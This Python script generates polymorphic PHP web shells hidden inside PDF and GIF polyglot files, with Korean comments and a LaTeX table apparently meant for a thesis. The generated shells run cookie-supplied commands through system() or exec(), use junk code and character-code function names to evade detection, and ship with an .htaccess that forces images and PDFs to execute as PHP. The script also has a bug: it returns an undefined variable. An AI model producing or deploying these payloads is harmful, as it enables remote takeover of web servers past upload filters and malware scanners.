import os
import random
import zlib
import json
import hashlib
from pathlib import Path

PAYLOAD_DIR = 'bypass_payloads_attack_max_v24_layer8_polymorphic'
METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_attack_v24.json')
LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_attack_v24.tex')

os.makedirs(PAYLOAD_DIR, exist_ok=True)

C2_DOMAIN = "http://127.0.0.1:6000"   # 실제 사용 시 변경

# ==================== Polymorphic Engine (A+++ 핵심) ====================
def random_var(prefix: str = "v") -> str:
    return f"{prefix}{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 12)))}"

def generate_polymorphic_stage1() -> str:
    """매번 완전히 다른 구조의 STAGE1 생성 (Polymorphism)"""
    v1, v2, v3, v4 = random_var(), random_var(), random_var(), random_var()
    fn_system = random_var("f")
    fn_exec = random_var("e")
    
    # Dynamic key derivation (빈도 분석 회피)
    key_deriv = f'''
    $k = substr(hash('sha256', ($_SERVER['HTTP_USER_AGENT']??'') . ($_SERVER['REMOTE_ADDR']??'')), 0, 32);
    '''
    
    # Polymorphic XOR + mixing (RC4-like)
    obfuscator = f'''
    function d($s) {{
        global $k;
        $s = base64_decode(preg_replace('/[^A-Za-z0-9+\\/=]/','', $s));
        $out = '';
        for($i=0;$i<strlen($s);$i++){{
            $out .= chr(ord($s[$i]) ^ ord($k[$i % 32]));
        }}
        // mixing layer (polymorphic)
        $out = strrev($out);
        return $out;
    }}
    '''
    
    # Junk code (dead code insertion)
    junk = random.choice([
        f"// {random_var()} dummy loop\nfor($i=0;$i<1;$i++);",
        f"/* {random_var()} */ ${random_var()} = array();",
        f"if(false) {{ ${random_var()} = 1; }}"
    ])
    
    stage = f'''<?php
declare(strict_types=1);
error_reporting(0);@ini_set('display_errors',0);@ini_set('log_errors',0);

{key_deriv}

// Polymorphic auth
${v1} = $_COOKIE['X-Sess'] ?? '';
${v2} = hash_hmac('sha256', ($_SERVER['HTTP_USER_AGENT']??'') . ($_SERVER['REMOTE_ADDR']??''), 'layer8_salt_2026');
if(${v1} !== ${v2}) die();

{junk}

// Polymorphic decoder
{obfuscator}

${v3} = $_COOKIE['p'] ?? '';
${v4} = d(${v3});

// Dynamic function call (polymorphic)
${fn_system} = implode('', [chr(115),chr(121),chr(115),chr(116),chr(101),chr(109)]);
if(function_exists(${fn_system})) {{
    call_user_func(${fn_system}, ${v4});
}} else {{
    ${fn_exec} = implode('', [chr(101),chr(120),chr(101),chr(99)]);
    if(function_exists(${fn_exec})) call_user_func(${fn_exec}, ${v4});
}}
?>
'''
    return stage

ATTACK_CORE_HTACCESS = f"""# v24 polymorphic .htaccess (random comment)
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^(.*)$ $1.php [L,QSA]
</IfModule>
# {random.randint(100000000,999999999)} random signature breaker
<FilesMatch "\\.(gif|jpg|jpeg|png|webp|pdf|svg|html)$">
    SetHandler application/x-httpd-php
    ForceType application/x-httpd-php
</FilesMatch>
"""

def save_payload(filename: str, content: bytes):
    path = os.path.join(PAYLOAD_DIR, filename)
    with open(path, 'wb') as f:
        f.write(content)
    if random.random() < 0.04:
        print(f"[+] 생성: {filename}")

def generate_ultra_pdf_polyglot(stage_content: bytes) -> tuple[bytes, str]:
    pdf_header = b'%PDF-1.7\n%\xff\xff\xff\xff\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
    pdf_footer = b'\n%%EOF\n'
    compressed = zlib.compress(stage_content, level=9)
    stream = b'2 0 obj\n<< /Length ' + str(len(compressed)).encode() + b' /Filter /FlateDecode >>\nstream\n' + compressed + b'\nendstream\nendobj\n'
    
    full_pdf = pdf_header + stream + pdf_footer
    garbage = b'\n% polymorphic padding ' + bytes(random.getrandbits(8) for _ in range(random.randint(120, 380)))
    full_pdf += garbage + b'\n<?php // valid PDF ends here\n' + stage_content
    return full_pdf, ".pdf"

def generate_v24():
    existing = [f for f in os.listdir(PAYLOAD_DIR) if not f.endswith(('.tex', '.json'))] if os.path.exists(PAYLOAD_DIR) else []
    
    if len(existing) > 35:
        print(f"[SKIP] 이미 {len(existing)}개 존재 → v24 생성 생략")
        return []

    save_payload(".htaccess", ATTACK_CORE_HTACCESS.encode())

    print("[*] v24 A+++ Polymorphic 공격 페이로드 생성 시작...")

    NUM_PAYLOADS = int(input("생성할 PDF/GIF 개수 (stealth 추천: 30~60, 기본 45): ") or "45")
    payloads_created = 0
    metadata = []

    for i in range(NUM_PAYLOADS):
        # 매번 새로운 polymorphic stage1 생성
        stage_content = generate_polymorphic_stage1().encode()
        
        if i < int(NUM_PAYLOADS * 0.9):
            if i % 3 == 0:
                stage_content = zlib.compress(stage_content)
            poly_content, ext = generate_ultra_pdf_polyglot(stage_content)
            cat = "pdf_poly_v24"
        else:
            padding = bytes(random.getrandbits(8) for _ in range(random.randint(180, 520)))
            poly_content = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;' + stage_content + padding
            ext = ".gif"
            cat = "gif_poly_v24"

        filename = f"{cat}_{i:04d}{ext}"
        save_payload(filename, poly_content)
        payloads_created += 1

        if i % 15 == 0:
            metadata.append({
                "id": i,
                "filename": filename,
                "type": cat,
                "size": len(poly_content),
                "obf_level": "polymorphic_xor_32byte + dynamic_structure",
                "strategy": "pdf_ultra" if "pdf" in cat else "gif_poly",
                "polymorphic": True
            })

    print(f"\n[SUCCESS] v24 A+++ Polymorphic 생성 완료 → 총 {payloads_created}개")
    print(f"폴더: {PAYLOAD_DIR}")

    with open(METADATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(metadata, f, indent=2, ensure_ascii=False)

    # LaTeX 테이블 (논문용)
    with open(LATEX_TABLE_FILE, 'w', encoding='utf-8') as f:
        f.write("\\begin{table}[h]\n\\centering\n\\caption{v24 A+++ Polymorphic WebShell Bypass Payloads}\n")
        f.write("\\begin{tabular}{|l|l|l|l|l|}\n\\hline\n")
        f.write("ID & Type & Size & Obf Level & Polymorphic \\\\\\hline\n")
        for m in metadata:
            f.write(f"{m['id']} & {m['type']} & {m['size']} & {m['obf_level']} & Yes \\\\\\hline\n")
        f.write("\\end{tabular}\n\\end{table}\n")

    return payloads

if __name__ == '__main__':
    generate_v24()
